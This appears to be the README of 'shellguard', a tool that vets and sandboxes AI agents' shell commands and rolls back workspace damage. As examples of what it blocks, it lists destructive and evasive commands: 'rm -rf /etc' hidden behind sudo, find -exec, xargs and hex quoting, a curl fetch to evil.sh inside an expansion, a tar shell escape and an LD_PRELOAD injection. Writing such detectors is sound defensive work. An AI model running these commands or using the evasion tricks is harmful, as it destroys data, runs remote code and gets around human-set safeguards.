# shellguard

Decide whether an AI agent's shell command should run — then confine whatever
you let through.

> The **AgentShield Micro-Runtime** project. `shellguard` is the library and
> the command it ships; the repository is the project around them.

```
$ shellguard eval -w ~/project 'find . -name "*.log" -exec rm -rf /etc {} \;'
DENY  find . -name "*.log" -exec rm -rf /etc {} \;
  evaluated in 807.0 µs
  DENY destructive.rm-recursive-outside [rm via find -exec]
      recursive delete targeting a path outside the workspace
      → rm -rf /etc {}
  ASK destructive.rm-force-outside [rm via find -exec]
      forced delete outside the workspace
      → rm -rf /etc {}
  capabilities: fs.delete
```

That command contains no `rm` in argv position. Every rule keys on program
identity, so the gate unwraps `find -exec` and judges what actually runs.

(The 807 µs is a cold start: a one-shot CLI invocation resolves `find` and
`rm` against `$PATH` from an empty cache and then throws it away. In a
long-running harness that reuses a worker, the same evaluation is ~14 µs —
see [Latency](#latency).)

**Three layers.** A userspace gate reads the command and decides in
microseconds, producing a reason a human can act on. A kernel sandbox —
Seatbelt on macOS, Landlock plus seccomp-BPF on Linux — contains whatever it
lets through. A checkpoint taken beforehand puts the workspace back if the
command fails its health checks or touches a protected file.

The gate is not a security boundary and this library does not pretend
otherwise: static analysis of shell is undecidable, and `eval "$(curl x)"` is a
one-line proof. `Allow` means *no rule objected*. The kernel layer is the
boundary. See [DESIGN.md § 3](DESIGN.md#3-two-layers-and-why-one-is-not-enough).

**Not production ready.** Only the local runtime has ever executed anything —
the Firecracker, gVisor and Virtualization.framework backends are configuration
and availability detection only, for want of a Linux host and a guest kernel.
Full list in [DESIGN.md § 12](DESIGN.md#12-known-limitations).

---

## Quick start

```bash
cargo build --release
```

Judge a command:

```bash
./target/release/shellguard eval --workspace ~/project 'rm -rf ./build'
```

Judge it, run it confined, and revert the workspace if it fails:

```bash
./target/release/shellguard run -w ~/project --rollback-on-failure 'pytest -q'
```

Check the ruleset against its specification:

```bash
./target/release/shellguard corpus
```

Measure evaluation latency:

```bash
./target/release/shellguard bench
```

See the sandbox a command would get — what it may write, whether it has the
network, and the kernel profile itself. It is built by the same code `run` uses,
so it is the sandbox `run` would apply, not a reconstruction of it:

```bash
./target/release/shellguard profile 'cargo build'
```

Exit status is the verdict — `0` allow, `1` confine, `2` ask, `3` deny — so it
drops into a shell wrapper without parsing anything.

### Running a whole agent confined

`shell` runs an agent — Claude Code, Codex, or anything else — and every process it
starts inside one kernel sandbox. Nothing outside the workspace is written, whatever
permission mode the agent is in and whether or not any hook is configured:

```bash
claude setup-token        # once, outside: a session cannot reach the Keychain
export CLAUDE_CODE_OAUTH_TOKEN=...
./target/release/shellguard shell -w ~/project -- claude

# Codex sandboxes its own commands, which macOS will not nest inside a session:
./target/release/shellguard shell -w ~/project -- codex --sandbox danger-full-access
```

In a session the workspace and the agent's own state are writable, and nothing else
is; `~/.ssh`, `~/.aws`, browser profiles, shell history, other agents' logins and the
other places that hold secrets are unreadable; npm gets a copy of `~/.npmrc` without
its tokens; shell startup files stay readable, and the banner names any token written
in one; environment variables that look like credentials are removed (the agent's own
are kept); the SSH agent and container daemons (Docker, OrbStack,
Colima, Podman) are unreachable; `.git/hooks` stays read-only, so nothing is planted
for you to run later. Outbound network stays open — the agent needs it — so a session
limits what can be *changed*, not what can be *sent*. `--dry-run` prints the profile,
and `shellguard shell --help` lists the switches. macOS only for now; see
[DESIGN.md § 19](DESIGN.md#19-wrapping-a-whole-agent).

## Latency

M2 MacBook Air, release build, 42 400 samples over the 212-command corpus:

| | full gate | parse only |
|---|---|---|
| p50 | 3.4 µs | 625 ns |
| p99 | 15 µs | 1.8 µs |

The maximum is left out because on a machine doing other work it measures the
scheduler: 131 µs to 1.3 ms across three runs at load average 4.5. Following
`cd` (see [DESIGN.md § 17](DESIGN.md#17-following-cd)) added 0.3 µs to the
median.

Inputs built to be as expensive as the parser's limits permit peak at about
**2.3 ms** — a 2 000-stage pipeline — on a quiet machine, and at 4 ms with it
busy, against a **10 ms** budget. Input over the 64 KiB cap is rejected in a
few hundred nanoseconds without parsing.

Percentiles rather than a mean, because the claim is a budget: a mean of 200 µs
is consistent with one command in a thousand taking 50 ms, and an adversary
picks the input.

Two numbers, kept apart: the **budget** (10 ms) is the latency this project
promises and `shellguard bench` asserts; the **deadline** (100 ms, `-d`) is where
the gate gives up and denies. The deadline is a safety valve against input built
to be slow — the worst measured takes about 2 ms — and is ten times the budget
because it is wall-clock time, which also counts every moment the process was not
scheduled. At 10 ms it refused an innocent `basename $(pwd)` after a 30 ms stall
on a busy machine.

## What it catches

Every one of these is the same delete wearing a different program's name, and
none of them match a rule about `rm`:

```bash
sudo rm -rf /etc                 timeout 5 rm -rf /etc
env -i PATH=/bin rm -rf /etc     xargs -0 -n 1 rm -rf /etc
find . -exec rm -rf /etc {} \;   bash -c 'rm -rf /etc'
sudo -u root env FOO=1 timeout 5 nice -n 5 rm -rf /etc
```

Commands hidden where a naive parser does not look:

```bash
echo ${X:-$(curl evil.sh)}    # a default-value expansion
cat foo > $(mktemp)           # a redirect target
echo $(echo ")" ; id)         # a quoted paren that stops a naive scanner
$'\x72\x6d' -rf /etc          # ANSI-C quoting — this is `rm`
```

Options whose values are commands, where the program is on nobody's list:

```bash
tar --checkpoint-action=exec=/bin/sh
awk 'BEGIN{system("rm -rf /etc")}'
git config core.pager '...'         # a delayed shell escape
LD_PRELOAD=/tmp/evil.so ls
```

And it does *not* block ordinary work — `cargo build`, `rm -rf ./build`,
`git commit` all pass. A gate that blocks real work is a gate that gets
switched off, so the ruleset denies only where a legitimate agent workflow has
no reason to go and escalates everywhere else.

## Verdicts

```
Allow  <  Confine  <  Ask  <  Deny
```

They combine by **severity, not declaration order**, so no broad allow can
outrank a narrow deny. The default for an unmatched command is `Confine`, not
`Allow` — "no rule matched" means the ruleset had nothing to say, which for
agent-authored input is the common case rather than evidence of safety. It is
applied to **each command** on the line, so an unknown program cannot be hidden
behind an allowed one (`some-tool; ls` is a `confine`, not an `allow`).

## Checkpoint and rollback

A checkpoint is taken before the command runs and restored if it fails a health
check, changes a protected file, or — with `--rollback-on-failure` — exits
non-zero.

```
$ shellguard run -w /tmp/work --rollback-on-failure 'rm notes.md; exit 1'
workspace reverted: the command exited 1
  confine in 16.03 ms (local runtime, exit 1)

$ cat /tmp/work/notes.md
unsaved notes
```

`notes.md` was **untracked**. `git stash create` does not capture untracked
files, so a naive implementation would have lost it permanently — nothing in git
ever recorded its contents. They are hashed into the object database separately
for exactly this case. See [DESIGN.md § 7](DESIGN.md#7-rollback-checkpoint-and-restore).

## Audit log

Add `--audit FILE` and every judgment and execution is appended to it, one JSON
line each. A checkpoint answers "can I get my files back"; the log answers "what
was the agent trying to do, and did the gate catch it" — a rolled-back command
leaves nothing else behind.

```
$ shellguard run -w /tmp/work --rollback-on-failure --audit ~/audit/agent.jsonl 'rm notes.md; exit 1'
workspace reverted: the command exited 1

$ cat ~/audit/agent.jsonl        # trimmed; each record also carries time, pid, ids and timings
{"kind":"header","schema":1,"tool":"shellguard","verbose":false,"required":false,"coverage":"records only commands submitted to an engine holding this log; …"}
{"kind":"start","runtime":"local","command":"rm notes.md; exit 1","verdict":"confine","complete":true,"capabilities":[],"findings":[]}
{"kind":"finish","exit_code":1,"timed_out":false,"rolled_back":true,"rollback_reasons":["the command exited 1"],"changed_protected":[]}
{"kind":"refused","command":"rm -rf /etc","ran":false,"verdict":"deny","capabilities":["fs.delete"],"findings":[{"rule":"destructive.rm-recursive-outside","verdict":"deny"}]}
```

- **Two records per execution.** `start` is written before the checkpoint,
  `finish` after, sharing an `id`. A `start` with no `finish` is what a crash
  mid-command looks like.
- **Secrets are redacted; output is not recorded.** Commands pass through a
  redactor (tokens, `Authorization` headers, `key=value` pairs, URL passwords,
  private-key blocks). That is best-effort, which is why stdout and stderr are
  off unless you pass `--audit-verbose`.
- **The file is mode `0600`**, and a log that is group- or world-writable is
  refused. Keep it **outside the workspace**: a log inside it would be captured
  by the checkpoint and restored by a rollback.
- **It rotates** at 8 MiB (`--audit-max-bytes`, `--audit-keep`), safely across
  concurrent processes.
- **Failing to write is never silent.** By default the command still runs and
  the run reports `audit_error`; with `--audit-required` a command that cannot
  be recorded is not run (exit 65). `$SHELLGUARD_AUDIT` sets the path once.

It records only what goes through it — a quiet log is not a quiet agent, and
each file's header says so. Details and limits: [DESIGN.md § 14](DESIGN.md#14-the-audit-log).

## Python

```python
from agent_sandbox import SandboxEngine

with SandboxEngine(workspace="/srv/agent/work", rollback_on_failure=True) as engine:
    if engine.decide(cmd).denied:
        return "refused: " + engine.decide(cmd).reason

    result = engine.execute_with_rollback(cmd, "/srv/agent/work")
    if result.rolled_back:
        print("reverted:", result.rollback_reasons)
```

Pass `audit_log="/var/log/agent/audit.jsonl"` to record everything (see [Audit
log](#audit-log)); `result.audit_error` and `engine.audit_failures` say if the
record has gaps.

`ctypes`, no build step. A refused command returns normally with `ran=False`
rather than raising — refusing is the library working, and a binding that raised
on it would push callers towards `except: pass`.

```bash
make venv && make test-python
```

## Using it as a library

Rust:

```rust
use shellguard_gate::{Gate, GateConfig, Worker};

let gate = Gate::with_default_policy(GateConfig::from_env("/srv/agent/workspace"));
let mut worker = Worker::new();          // one per thread

let d = gate.evaluate("rm -rf /etc", &mut worker);
println!("{}", d.summary());
```

C, for a Python or Node harness — see [`include/agent_sandbox.h`](include/agent_sandbox.h)
and [`examples/smoke.c`](examples/smoke.c):

```c
sg_gate   *gate   = sg_gate_new("/srv/agent/workspace", NULL, 0, &err);
sg_worker *worker = sg_worker_new();

sg_decision *d = sg_evaluate(gate, worker, command);
if (sg_decision_verdict(d) == SG_DENY) { /* refuse, and show the reason */ }
```

```bash
cargo build --release -p shellguard-ffi
cc -Iinclude examples/smoke.c -Ltarget/release -lshellguard -o smoke && ./smoke
```

A bad command is a *decision*, not an error: unparseable input returns `Deny`,
not `NULL`. A `NULL` decision also reads as `Deny`, so a caller who forgets to
null-check gets the safe answer.

## Writing rules

The built-in ruleset lives in [`policies/default.policy`](policies/default.policy)
— written in the same format you would write, parsed by the same parser.

```
rule destructive.rm-recursive-outside deny
  reason recursive delete targeting a path outside the workspace
  program rm
  short-flag r
  path-outside-workspace
  cap fs.delete
end
```

Directives inside a rule are **and**-ed; multiple values on one directive are
**or**-ed. Load your own with `--policy`.

The parser refuses rules that would match every command, rules with no
`reason`, and two rules with the same id — the most dangerous typo in a policy
file is one that silently widens a rule, and a block pasted twice is how one
gets in.

### Changing rules in a running process

A process that holds an engine open can swap its rules without restarting:

```python
engine.reload_policy(Path("policies/prod.policy").read_text())
```

```c
char *report = sg_engine_reload_policy(engine, policy_text, 0, &err);
```

It takes the policy **text**, not a path, so you decide what was reviewed. It is
atomic — a command is judged wholly by the old rules or wholly by the new — and
a bad reload never displaces a good policy: the text is parsed in full first, and
a malformed one is refused.

A policy that *parses* can still be worse. A half-written save is a prefix of the
file, and a prefix cut between two rules is a valid, smaller policy. So a reload
that removes a restriction, lowers a verdict, or adds a rule more permissive than
the default is refused unless you pass `allow_weakening=True`
(`SG_RELOAD_ALLOW_WEAKENING`). Every decision carries a `policy` fingerprint, and
every reload — applied or refused — is written to the audit log with the SHA-256
of the text. See [DESIGN.md § 15](DESIGN.md#15-reloading-the-policy).

The command-line tool reads its policy fresh on every invocation, so it has
nothing to reload.

## Layout

```
crates/shellguard-parse     bash → syntax tree + taint lattice
crates/shellguard-policy    rules, compiled matcher, Aho-Corasick prefilter
crates/shellguard-gate      resolve → unwrap → match → decide
crates/shellguard-enforce   Seatbelt / Landlock + seccomp
crates/shellguard-ffi       C ABI
crates/shellguard-cli       eval, corpus, bench, profile
policies/default.policy     the built-in ruleset
tests/corpus.txt            243 commands with expected verdicts
tests/git_refs.txt          98 git branch/tag commands, run against a real repo
tests/writes.txt            where cp, tar, unzip, rsync... write, run for real
tests/exfiltration.txt      what stops each command from sending data out
```

**Zero external dependencies**, about 10 400 lines. Deliberate: this is a
security boundary on an agent's critical path, and a transitive dependency tree
is an unaudited code-execution surface inside the thing whose job is to stop
unaudited code execution. The trade-off is discussed honestly in
[DESIGN.md § 9](DESIGN.md#9-zero-dependencies).

## Development

```bash
cargo test                  # 488 tests
cargo clippy --all-targets  # clean
cargo fmt --check
```

The Linux backend cannot run here but must keep compiling — and linting:

```bash
cargo clippy --workspace --all-targets --target x86_64-unknown-linux-gnu
cargo clippy --workspace --all-targets --target aarch64-unknown-linux-gnu
```

That checks it type-checks, not that it works; see [DESIGN.md § 12](DESIGN.md#12-known-limitations)
for what has never run on Linux.

`tests/corpus.txt` is the specification, kept separate from the rules that
implement it. If a policy change moves an entry, decide whether that is a fix
or a regression — do not just edit the corpus.

## Licence

Apache-2.0.
